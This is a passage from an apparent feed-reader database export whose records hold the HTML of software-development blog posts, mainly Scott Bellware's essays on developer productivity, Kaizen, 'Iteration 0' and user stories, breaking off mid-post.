promote employees based upon their position, but also to assign vacation days based upon the project to which the empoloyee is currently assigned?  A situation where we needed a class for TechnicalLeadWhoIsWorkingOnProjectX arises.<br /><br />Another reason to use the state pattern instead of full blown polymoprhism of the domain object is when using an ORM such as NHibernate.  NHibernate with Single Table Inheritance does not make it easy to change the type of a persistent object.  You can do with with SQL, but it's a clumbsy solution.<br /><h3>Conclusions</h3>The state pattern is a useful tool in a programmer's swiss army knife of design patterns.  It can help you avoid ugly switch statements and encapsulate domain logic in a flexible manner.<br /><br /><a href=\"http://www.dotnetkicks.com/kick/?url=http%3a%2f%2fnathan.whiteboard-it.com%2farchive%2f2008%2f09%2f01%2fstate-pattern.aspx\"><img border=\"0\" src=\"http://www.dotnetkicks.com/Services/Images/KickItImageGenerator.ashx?url=http%3a%2f%2fnathan.whiteboard-it.com%2farchive%2f2008%2f09%2f01%2fstate-pattern.aspx\" alt=\"kick it on DotNetKicks.com\" /></a><img src=\"http://nathan.whiteboard-it.com/aggbug/13.aspx\" width=\"1\" height=\"1\" /><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~f/PublicClassWheel?a=B94fT4V7\"><img src=\"http://feeds.feedburner.com/~f/PublicClassWheel?d=1304\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~f/PublicClassWheel?a=d1UCKwEU\"><img src=\"http://feeds.feedburner.com/~f/PublicClassWheel?d=41\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~f/PublicClassWheel?a=Ap8lmOjk\"><img src=\"http://feeds.feedburner.com/~f/PublicClassWheel?d=50\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/PublicClassWheel/~4/t1gk0-VJumg\" height=\"1\" width=\"1\"/>","author":"Nathan Stott","_id":{"$wrap":"$oid","v":1050}}
{"k":"0000000084","o":"0000011100","v":"001"}
{"_id":1051,"_uid":1051,"_dt":1373742611901,"_s":"6736cef214ad974f818edfad278df160"}
{"subscription":{"$wrap":"$oid","v":38},"link":"http://feedproxy.google.com/~r/sbellware/~3/3MVgvl0n5ng/simple-definitive-metric-of-software.html","title":"A Simple, Definitive Metric of Software Development Productivity","published":{"$wrap":"$date","v":1298989320007,"h":"2011-03-01T14:22:00.007Z"},"starred":false,"read":false,"content":"Developer productivity is made of two components: 1-) the speed at which work is done when work is getting done, and 2-) the amount of time that is lost when anything stands in the way of getting work done, or more specifically, of getting \"value-added\" work done.<br /><br />The most common mistake in measuring software developer productivity is the failure to take both components into consideration.<br /><br />Productivity is what's left over when you subtract the amount of time lost to non-value-added work from the total time spent working. If you only ever measure your pace when doing value-added work, the results will be a massive over-statement of developer productivity.<br /><br />Complicating matters further, developers' natural pride in workmanship can make classifying work as \"non-value-added\" a difficult task. Without an environment that is entirely supportive of transparency, learning, and improving, truthful measurements of productivity are just not possible. Far too many personal preservation mechanisms will get in the way.<br /><br />The hard, cold truth about developer productivity is that a truthful measure of productivity on a typical software development team is in the 10% to 30% range. Getting a clear picture of the reality of software productivity on your team remains a necessary effort - even in light of the difficulties of undertaking it.<br /><br /><b>Non-Value-Added Work</b><br /><br />Pride in workmanship is what keeps most developers engaged in the work, but it's a double-edged sword. Peter Drucker's famous quote applies: \"There is nothing so useless as doing efficiently that which should not be done at all\".<div><br />We have to come to terms with non-value-added work. We have to<i>consent</i>to it. Non-value-added work simply<i>is</i>.</div><div><br /></div><div>If we're willing to consent to the reality of non-value-added work, then we'll be open to seeing it. Seeing it is the first step toward measuring productivity meaningfully, which is the first step to developing an action plan for restoring productivity.<br /><br />If you can get comfortable with the reality of non-value-added work, then you can get comfortable with using its proper name:<i>waste</i>.</div><div><br />Here are a few things that we do that are waste - regardless of any pride we might have in the hard work and perseverance involved:<br /><br /><ul><li>Teasing apart code to understand how it works, especially when this effort is repeated whenever a team member confronts that code</li><li>Performing deep and complex setups of data in an external system (or systems) in order to prove that changes to a local system are correct</li><li>Hiding distributed systems behind interfaces that pretend that remote objects are local objects</li><li>Failing to create transparency in objects' interfaces as to their underlying latency, or network and storage protocols</li><li>Creating development infrastructure, tools, or automation that is only readily-understood by people who have had extensive experience with them</li><li>Failing to properly codify or tag tests so that knowledge of which tests to run and how to run them when a change is made is obvious</li><li>Designing tests who's failures aren't definitive proof of either defacto functional errors or mistakes in setting up or operating up the test environment</li><li>Failing to recognize excess tests as coupling problems that obstruct needed design changes</li><li>Designing tests with either excess specificity, test granularity, or penetration into adjacent modules</li><li>Underestimating the destructiveness of ambiguity in any code or any other development artifact in general</li><li>amongst many other things that can appear as hard-won effort</li></ul><br />In short, any work you do that isn't directly related to adding desired capabilities to the system is waste. Any work that you do to resolve obstructions to getting your work done is waste - even if that work improves the overall quality of the system. The reason is simple: obstructions are mistakes that you haven't yet learned not to make.<br /><br />Some design challenges are due to unforeseen changes in direction in technology or business. As long as you can make those changes without also having to deal with negligent design choices and expediencies of the past, then you're still adding value. The moment you have to deal with obstructions to the work, you're incurring waste - no matter how attached you might be with the designs, mechanisms, and even human organizations and processes that underly the obstructions.<br /><br />There may always be some waste in the work, but the presence of it doesn't excuse an aversion to seeing it for what it is, accepting that it's there, consenting to its presence, and developing the means to aggressively and progressively eliminate it.<br /><br /><b>Measuring Productivity</b><br /><br />Here's how to get a clear, honest look at software development productivity:<br /><br />The moment you're forced to divert to non-value-added work, write down the time. The moment you're back on track doing value-added work, write down that time. At the end of the day, add up all the non-value-added time and subtract it from your total work time.<br /><br />Your work time shouldn't include things that aren't time spent on developer activities unless they're directly related to dealing with an obstruction. For example, a lunch break isn't non-value-added time. However, a walk to the break room to blow off the steam building up from dealing with frustrating design mistakes is counted as non-value-added time. A standup meeting isn't non-value-added time, but a meeting to address an obstruction or to resolve an ambiguity is non-value-added time.<br /><br />You'll inevitably come across grey areas where some time spent isn't easily classified as non-value-added or value-added. This is especially-true of explicit improvement efforts. Discussing these grey areas with your team and coming to some conclusion is a valuable part of the larger improvement journey that you're on.<div><br /></div><div>Make all the factors feeding your considerations explicit and come to the best decision you can for the circumstances you face. And most of all, understand that different circumstances might lead to different conclusions. Make these differences explicit as well. Open dialog and flexibility is an absolute must, but so is rigor. Keep an open mind (an open heart is also helpful), but be vigilant against allowing a discussion to become a zoo.<br /><br />If you do a daily standup or status meeting, or have an activity stream app like Campfire, an IRC channel, or even email, report on your productivity every day. Even if you're the only person on your team undertaking the exercise (note: this isn't really sustainable), you can report your productivity.<br /><br />The goal is to be transparent about the truth of your software development productivity. Once the truth is laid out for all to see, it has a chance of affecting the moment-by-moment decisions that you and your teammates make that continue to confound progress.<br /><br /><b>Next Steps</b><br /><br /><div>Wherever there's waste, there's an accumulation of excess complexity that encourages even more waste. The goal is to fix the design problems that cause it, and to restore productivity to sensible levels. And ultimately, to fix the processes that encourages the waste that exacerbates the design problems that take up long-term residence.</div><div><br /></div><div>We have to remain utterly unattached to the efforts we invest in solving problems that should not have existed in the first place. If we're not capable of adopting such a disposition, we're incapable of harvesting enough learning about counter-productivity to restore productivity.</div><div><br /></div></div><div>If you can measure your productivity truthfully, then you can work with your team to collectively improve the situation, and to continue to improve it.<br /><br />The start of an improvement effort begins with recognition of a problem and a pathology. Being able to make measurements of the problem is essential to recognizing the problem and also to monitor progress. By developing the ability to recognize waste, you've also given yourself some basic tools to monitor your progress. Measurement might be a bit depressing at first, but it also becomes encouraging as you make progress.<br /><br />The anatomy of an improvement effort is the subject for another day, but suffice to say that what you're trying to create is a Learning Culture. Doing this isn't a quick-fix, but undertaking it will yield some benefit immediately, and continue to yield a constant stream of value along the way.<br /><br /><hr /><a href=\"http://ampgt.com/\"><img alt=\"Ampersand GT\" src=\"http://ampgt.com/images/ampgt_text_logo.gif\" border=\"0\" /></a><p>Working with software developers and organizations to help realize the potential of software product development through higher productivity, higher quality, and improved customer experience</p><p>Learn more about my work and how I can help you at<a href=\"http://ampgt.com/\" target=\"_blank\">ampgt.com</a></p></div></div><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=3MVgvl0n5ng:Cnfm1E6f1_M:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=3MVgvl0n5ng:Cnfm1E6f1_M:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=3MVgvl0n5ng:Cnfm1E6f1_M:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=3MVgvl0n5ng:Cnfm1E6f1_M:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=7Q72WNTAKBA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=3MVgvl0n5ng:Cnfm1E6f1_M:l6gmwiTKsz0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=l6gmwiTKsz0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=3MVgvl0n5ng:Cnfm1E6f1_M:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=dnMXMwOfBR0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=3MVgvl0n5ng:Cnfm1E6f1_M:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=3MVgvl0n5ng:Cnfm1E6f1_M:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=3MVgvl0n5ng:Cnfm1E6f1_M:TzevzKxY174\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=TzevzKxY174\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/sbellware/~4/3MVgvl0n5ng\" height=\"1\" width=\"1\"/>","author":"Scott Bellware","_id":{"$wrap":"$oid","v":1051}}
{"k":"0000000084","o":"0000005314","v":"001"}
{"_id":1052,"_uid":1052,"_dt":1373742611901,"_s":"46eb7d16a6239033a265607dcbee79d4"}
{"subscription":{"$wrap":"$oid","v":38},"link":"http://feedproxy.google.com/~r/sbellware/~3/JqSKKCX7Tts/kaizen-relentless-rather-than.html","title":"Kaizen: \"Relentless\", Rather than \"Continuous\"","published":{"$wrap":"$date","v":1295362320005,"h":"2011-01-18T14:52:00.005Z"},"starred":false,"read":false,"content":"\"Kaizen\" is usually translated from Japanese to English as \"Continuous Improvement\". It loses its power in the translation.<br /><br />\"Continuous\" is perfectly reasonable and correct, but it doesn't really convey Kaizen as the underpinnings of a way doing work. Kaizen is certainly continuous, but it's continuous as a side effect. More importantly than being<em>continuous</em>, Kaizen is<strong><em>relentless</em></strong>.<br /><br />\"Continuous Improvement\" can become a flaccid thing - yet another empty corporate mission. At its worst, it reinforces workers' cynicism about cultural initiatives that don't really make work or outcomes any better. \"Continuous Improvement\" is passive. It's even apologetic and deferential. \"Relentless Improvement\" is active. It's even fair to say that Kaizen is<em>aggressive</em>.<br /><br />Often, the real problems robbing an organization of its productivity are the smaller, pervasive problems that are finely-woven into the fabric of the way that work is done and conceptualized. When you solve problems that are inherent in the DNA of the work (and consequently, the organization), you'll likely free up more resources than you might have imagined. A<em>Kaizen culture</em>understands that microscopic, pervasive rot causes a kind of osteoporosis in the bones of the work that can't be seen without actively hunting it with fine optics, or until the bones start to break.<br /><br />A Kaizen culture doesn't wait for problems to show up. It looks for problems. It's imbued with an awareness that<em>negligible</em>problems often aren't negligible at all - especially when they're pathological and pervasive. It knows that pathological and pervasive problems are often charged with the greatest potential for destruction. Kaizen is literally \"looking for trouble\", knowing that if it doesn't, trouble will find it. It challenges its belief that these<em>negligible</em>problems are not worth effort or attention. It grounds its exploration in meaningful but practicable, and accessible<a href=\"http://en.wikipedia.org/wiki/PDCA\">measurements</a>, rather than in methodology mysticism. In progressively learning what measurements are interesting and practical, it learns to ask better questions.<br /><br />When a Kaizen culture doesn't see problems, it wonders first whether its vision needs improvement, and sets out to sharpen its eyes rather than rest on its laurels and dull its senses. The adage, \"If it ain't broke, don't fix it\", is a fallacy. Waiting for problems to come to you means that you're dancing to their tune. The downward, entropic cycle of fire-fighting and decay isn't transformed into a greater capacity to keep moving forward without constantly losing ground.<br /><br />In the end, \"Continuous Improvement\" is useful because it's a standard term. But when it's time to actually<em>do</em>Kaizen, \"Relentless Improvement\" sets more realistic expectations about how it achieves pervasive dominance over pervasive problems.<br /><br /><hr /><a href=\"http://ampgt.com/\"><img alt=\"Ampersand GT\" src=\"http://ampgt.com/images/ampgt_text_logo.gif\" border=\"0\" /></a><p>Working with software developers and organizations to help realize the potential of software product development through higher productivity, higher quality, and improved customer experience</p><p>Learn more about my work and how I can help you at<a href=\"http://ampgt.com/\" target=\"_blank\">ampgt.com</a></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=JqSKKCX7Tts:SkzepMGr4C8:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=JqSKKCX7Tts:SkzepMGr4C8:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=JqSKKCX7Tts:SkzepMGr4C8:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=JqSKKCX7Tts:SkzepMGr4C8:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=7Q72WNTAKBA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=JqSKKCX7Tts:SkzepMGr4C8:l6gmwiTKsz0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=l6gmwiTKsz0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=JqSKKCX7Tts:SkzepMGr4C8:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=dnMXMwOfBR0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=JqSKKCX7Tts:SkzepMGr4C8:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=JqSKKCX7Tts:SkzepMGr4C8:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=JqSKKCX7Tts:SkzepMGr4C8:TzevzKxY174\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=TzevzKxY174\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/sbellware/~4/JqSKKCX7Tts\" height=\"1\" width=\"1\"/>","author":"Scott Bellware","_id":{"$wrap":"$oid","v":1052}}
{"k":"0000000084","o":"0000006944","v":"001"}
{"_id":1053,"_uid":1053,"_dt":1373742611901,"_s":"8e3328b7eee3fe7fa5cda02fa2c1c628"}
{"subscription":{"$wrap":"$oid","v":38},"link":"http://feedproxy.google.com/~r/sbellware/~3/c6-06n7Tzic/myth-of-iteration-0.html","title":"The Myth of Iteration 0","published":{"$wrap":"$date","v":1288014300035,"h":"2010-10-25T13:45:00.035Z"},"starred":false,"read":false,"content":"\"Iteration 0\" is the initial phase on an Agile project when collaboration tools such as a source code repository server, a continuous integration server, and distributed build and test agents, as well as document tools like wiki servers, and other tools are set up. It's often also a time to configure individual workstations and team members' tools in preparation for everyone starting work.<br /><br />\"Iteration 0\" is a bit of a popular misconception that is a side-effect of software projects initiated by technologists - which sounds a bit ridiculous at first. After all, who else but technologists to do software projects? Of course technologists are the right people to do software projects, but are all technologists the right people to execute project startup? And for that matter, what is \"project startup\" as differentiated from the rest of the work? Is it something that should be approached differently than the rest of the work?<br /><br />The technology-focused project initiation isn't necessarily the wrong thing to do, but it's often only the right thing to do from within the technologist's perspective, and that perspective can be limited. A tool-biased perspective is a challenging thing to overcome by someone whose moment-by-moment work is necessarily suffused with a constant focus on tools, or whose initial career path passes through a lengthy time of tool focus.<br /><br />If we literally codify the \"first iteration\" as \"Iteration 1\", we technologists can use a bit of geekery to make allowances for a<span style=\"font-style:italic;\">pre-iteration</span>focused on technology. As programmers, we're accustomed to counting a list of things starting from zero. If the list of iterations starts at the \"zeroeth\" position, but work is only scheduled to start on the first position, then we get an extra \"unclaimed\" iteration to work with: \"Iteration 0\".<br /><br />Any way you cut it, the first iteration is the first iteration, regardless of the numerical designation assigned to it - and regardless of creative license and word games. If you choose to have a zero-based project schedule, then we should naturally change the schedule to state, \"Deliver something user-valued in Iteration 0\". Which, consequently, is not an invitation to technologists to insert an \"Iteration -1\" at the head of the schedule.<br /><br />Over the past few years the caution to not exit any iteration having only shipped technology has been whittled down to a more technologist-friendly caution against exiting an iteration having only shipped<span style=\"font-style:italic;\">frameworks</span>. It's a narrower interpretation of a deeply-powerful principle. It sets the stage for the institution of a technology-focused \"Iteration 0\".<br /><br />Nonetheless, it's sometimes necessary to devote a period of work entirely to technology concerns - especially if technology concerns become obstructions to user-valued concerns. And it's all too easy for technology to become an obstruction to delivery in a technology product delivery effort. But this isn't the problem with \"Iteration 0\".<br /><br />\"Iteration 0\" is a project startup issue that is technology-focused startup rather than a product-focused project startup. There's an implicit assumption in \"Iteration 0\" that - while perfectly reasonable from a technologist's perspective - isn't necessarily an optimal path for project startup.<br /><br />If a project startup is executed with \"all hands on deck\", then coordination of the people involved becomes an issue that must be dealt with right of the bat, including the setup of tools that support the coordination.<br /><br />So, is it necessary to start a project with an amount of people that necessitates coordination and collaboration<span style=\"font-style:italic;\">tools</span>? If project startup is executed with a small workcell of skilled pathfinders, do they need the tools that necessitate the \"Iteration 0\" work? Can a project startup be executed without the need for the collaboration tool setup?<br /><br />And more importantly:<span style=\"font-weight:bold;\">Is there a benefit to executing project startup without the full compliment of technologists that we'll need for full-steam-ahead solution development?</span><br /><br />The answer to this is usually a resounding \"Yes\", there is a benefit. A good bit of the reasoning and guidance is found more in the Lean Startup and Lean Product Development bodies of knowledge than the colloquial Agile body of knowledge.<br /><br />There's a time to activate a full compliment of development staff, but the optimal time is rarely the start of development work.<br /><br /><hr /><a href=\"http://ampgt.com/\"><img alt=\"Ampersand GT\" src=\"http://ampgt.com/images/ampgt_text_logo.gif\" border=\"0\" /></a><p>Working with software developers and organizations to help realize the potential of software product development through higher productivity, higher quality, and improved customer experience</p><p>Learn more about my work and how I can help you at<a href=\"http://ampgt.com/\" target=\"_blank\">ampgt.com</a></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=c6-06n7Tzic:3Ow8xOVSjpk:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=c6-06n7Tzic:3Ow8xOVSjpk:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=c6-06n7Tzic:3Ow8xOVSjpk:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=c6-06n7Tzic:3Ow8xOVSjpk:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=7Q72WNTAKBA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=c6-06n7Tzic:3Ow8xOVSjpk:l6gmwiTKsz0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=l6gmwiTKsz0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=c6-06n7Tzic:3Ow8xOVSjpk:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=dnMXMwOfBR0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=c6-06n7Tzic:3Ow8xOVSjpk:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=c6-06n7Tzic:3Ow8xOVSjpk:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=c6-06n7Tzic:3Ow8xOVSjpk:TzevzKxY174\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=TzevzKxY174\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/sbellware/~4/c6-06n7Tzic\" height=\"1\" width=\"1\"/>","author":"Scott Bellware","_id":{"$wrap":"$oid","v":1053}}
{"k":"0000000084","o":"0000008358","v":"001"}
{"_id":1054,"_uid":1054,"_dt":1373742611902,"_s":"76ca128b734748f4a740729ce9854a8f"}
{"subscription":{"$wrap":"$oid","v":38},"link":"http://feedproxy.google.com/~r/sbellware/~3/1F2Tc2YDnUg/testing-user-stories-problem.html","title":"Testing User Stories - Problem Development Before Solution Development","published":{"$wrap":"$date","v":1288273500032,"h":"2010-10-28T13:45:00.032Z"},"starred":false,"read":false,"content":"User stories can be wrong. Business Analysts and Product Owners can be wrong. They can be the best representatives of user interests but they're often still<span style=\"font-style:italic;\">proxy</span>users. The most expensive mistakes to be made in software product development are made when we get the requirements wrong. A quick way to increases the risk of proceeding to solution development on the basis of incorrect requirements is to not prove that they're right. Or, in other words, to not<span style=\"font-style:italic;\">test</span>them.<br /><br />The only way to<span style=\"font-style:italic;\">definitively</span>validate that the problem statements for a software product are right is to put the working software in users' hands.<br /><br />User interviews, focus groups, simulations, and mockups are steps along the way, but their purpose is to reduce the time and cost of getting users in front of an experience that is immersive enough to validate assumptions. Allowing users to experience our proposed solutions to their problems clarifies whether the problem is understood.<br /><br />Generally, we're taking too long to get stories validated - even in colloquial Agile development. Sending a user story through an entire development process in order to validate it is too much. In order to validate user stories, we need to collapse the solution development timeline so that feedback can be had without the expense of the solution development. We commit to the solution development cost once we've validated the problem.<br /><br />There are two distinct (but inextricably-intertwined) steps that make up a development process that recognizes the value of reducing the time-to-feedback for testing user stories. The later step is the plain-old<span style=\"font-style:italic;\">Solution Development</span>that we use regardless of whether we recognize a preliminary first step. The earlier step is<span style=\"font-style:italic;\">Problem Development</span>.<br /><br />Problem Development is software development. There's code. There's deployment. There's testing. There's design and analysis. There's process. There's just much more of it in Solution Development (even Agile development) than in Problem Development. And there are different kinds and variations of these activities in each. Problem Development is software development that works hand-in-hand with business development.<br /><br />Problem Development and Solution Development have different goals. Problem Development is concerned with feeding Solution Development with input that has less risk (at a time when risk is the riskiest).<br /><br />Assumptions are liabilities. User stories are assumptions until they're validated. To validate user stories, deliver software experiences that propose to solve the problems that user stories describe, and measure the feedback. There's<span style=\"font-style:italic;\">delivery</span>in Problem Development, but not<span style=\"font-style:italic;\">final delivery</span>.<br /><br />Final delivery is a concern of Solution Development. Final delivery requires<span style=\"font-style:italic;\">long-term sustainability</span>. Solution Development is concerned with long-term sustainability. When we work toward achieving long-term sustainability before we need it, we end waiting until the longer Solution Development process plays out before getting feedback on user story validity. Which is too long.<br /><br />Problem Development is concerned with<span style=\"font-style:italic;\">short-term sustainability</span>. The reason that it has to be sustainable at all is that the output of Problem Development is the input to Solution Development, and these two steps are ultimately one process that flows together.<br /><br />It's far too easy to see Problem Development as \"throw-away coding\", but it's absolutely not. Problem Development is a way to manage some of the biggest risks in software development - risks that often go un-addressed and are frequently realized as wasted effort and resources, and lower productivity. This kind of risk isn't effectively managed with practices that are satisfied by \"throw-away\" code.<br /><br />If throw-away code is the output of Problem Development, then Solution Development has to undergo a (mostly) cold start, benefiting from far less of the momentum created by Problem Development. It might be necessary to make the kind of tradeoff that creates these kinds of<span style=\"font-style:italic;\">batch transfer</span>problems, but making a habit of it is a path to a cumulative productivity deficit.<br /><br />The kinds of practices that characterize Problem Development might look like software development heresy (or at least \"Agile\" heresy) to many disciplined solution developers. The realities of Problem Development mean that traditional aspects of Solution Development are short-circuited - after all, Problem Development is looking for a shorter circuit.<br /><br />The Problem Development practices might even seem irresponsible, but recognize whether you're looking through a Solution Development lens. For just as Problem Development practices can seem irresponsible from a Solution Development perspective, applying Solution Development practices to the point in the timeline best suited to Problem Development can be equally as irresponsible.<br /><br />Problem Development is about testing or<span style=\"font-style:italic;\">validating</span>user stories' problem statements. Solution Development is about building software based on validated problem statements.<br /><br />The whole of development process is concerned with finding the<a href=\"http://leastway.org\" target=\"_blank\">way with the least</a>wasted effort in getting from<a href=\"http://www.amazon.com/Implementing-Lean-Software-Development-Concept/dp/0321437381\" target=\"_blank\">concept to cash</a>.<br /><br />Feeding un-validated user stories into the Solution Development transformer is often the most efficient way to increase wasted effort.<br /><br /><br /><hr /><a href=\"http://ampgt.com/\"><img alt=\"Ampersand GT\" src=\"http://ampgt.com/images/ampgt_text_logo.gif\" border=\"0\" /></a><p>Working with software developers and organizations to help realize the potential of software product development through higher productivity, higher quality, and improved customer experience</p><p>Learn more about my work and how I can help you at<a href=\"http://ampgt.com/\" target=\"_blank\">ampgt.com</a></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=1F2Tc2YDnUg:PIka4NTP1_c:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=1F2Tc2YDnUg:PIka4NTP1_c:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=1F2Tc2YDnUg:PIka4NTP1_c:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=1F2Tc2YDnUg:PIka4NTP1_c:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=7Q72WNTAKBA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=1F2Tc2YDnUg:PIka4NTP1_c:l6gmwiTKsz0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=l6gmwiTKsz0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=1F2Tc2YDnUg:PIka4NTP1_c:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=dnMXMwOfBR0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=1F2Tc2YDnUg:PIka4NTP1_c:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=1F2Tc2YDnUg:PIka4NTP1_c:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=1F2Tc2YDnUg:PIka4NTP1_c:TzevzKxY174\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=TzevzKxY174\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/sbellware/~4/1F2Tc2YDnUg\" height=\"1\" width=\"1\"/>","author":"Scott Bellware","_id":{"$wrap":"$oid","v":1054}}
{"k":"0000000084","o":"0000019560","v":"001"}
{"_id":1055,"_uid":1055,"_dt":1373742611902,"_s":"b5b378e1a5400de00b9c03a3c50d44f7"}
{"subscription":{"$wrap":"$oid","v":38},"link":"http://feedproxy.google.com/~r/sbellware/~3/NGSbe8s34mE/user-stories-belong-to-everyone.html","title":"User Stories Belong to Everyone","published":{"$wrap":"$date","v":1286200500001,"h":"2010-10-04T13:55:00.001Z"},"starred":false,"read":false,"content":"When Agile development is done well, user stories are always visible to everyone involved in turning ideas into working products. And they're visible all the time. When individuals or individual specializations involved presume a sense of \"ownership\" over user stories, doing Agile development well becomes difficult if not entirely impossible, save for a veneer of \"Agile Theater\".<br /><br />As user stories flow through the whole development process from conception to delivery, they pass through the hands of a number of job functions and workers. Any time that people working in the vicinity of a given work step are given to believe that they \"own\" the user story in their current purview, they are likely to displace the user story from the most public and most visible medium that is common to the whole team. User stories are often then removed to the bowels of tools that are practical and accessible only to workers at the current work step and its immediate vicinity.<br /><br />User stories can, do, and should change as they march forward through elaboration from concept to working product. Product development is a process of constantly unearthing a clearer understanding of the work we're doing while we're doing it. No amount of up-front analysis and design can stop this from happening. It's the nature of the kind of work that software development is, ie: product development.<br /><br />If software development were manufacturing work, we'd know what would be happening in each step of the process before it happened. But then, we'd have to be creating exactly the same product again and again, which would be nothing short of an absurdity for software development.<br /><br />The further we get into the process of turning an idea into concrete, material product, the greater the clarity and amount of thinking that gets invested into what we're doing. The more thinking invested, the more that we come to understand the subject matter we're working with, the circumstances of product's intended audience, and the fit of the decisions we've made earlier in the process to the reality waiting at the end of the process when real workers will try to do real work with the delivered product.<br /><br />Analysis and design are present in absolutely every kind of work done in software development, and present in every stage and every work step. And while we may indeed have work steps early in software development processes that appear to be characterized by work exclusively in analysis and design, this is ultimately a consequence of not having concrete product yet in-hand at those early stages.<br /><br />These early stages are less \"Analysis and Design\" stages as they are \"Absence of Material Product\" stages. We resort to seeing early stages as \"Analysis and Design\" due more to a habit of human perception that tends to draw attention to things that are present than to things that are absent. But later stages are no less \"Analysis and Design\" stages as a \"Testing\" stage in any less of a \"Development\" stage.<br /><br />It's the same cognitive wrinkle that makes<span style=\"font-style: italic;\">negative space</span>visualizations like<a href=\"http://en.wikipedia.org/wiki/Rubin_vase\">Rubin's Vase</a>or the<a href=\"http://www.google.com/images?um=1&hl=en&safe=off&rlz=1B5_____enUS335US335&biw=935&bih=503&tbs=isch%3A1&sa=1&q=fedex+logo&aq=f&aqi=&aql=&oq=&gs_rfai=\">FedEx logo</a>so compelling when we finally recognize the secondary images conveyed by the space that our cognitive facilities filter out. It's also what keeps us from being in a constant state of anxiety due to cognitive overload, and what allows us to be mindful of predators (not to mention to be unmindful of camouflage).<br /><br />The kinds of work we do in software product development are rarely unique to any given stage. The kinds of work we do accumulates continuously so that later stages have responsibilities for nearly all of the kinds of work done in software development throughout the entire process. That's not to say that front-loading software development work with conceptual work is a bad idea. 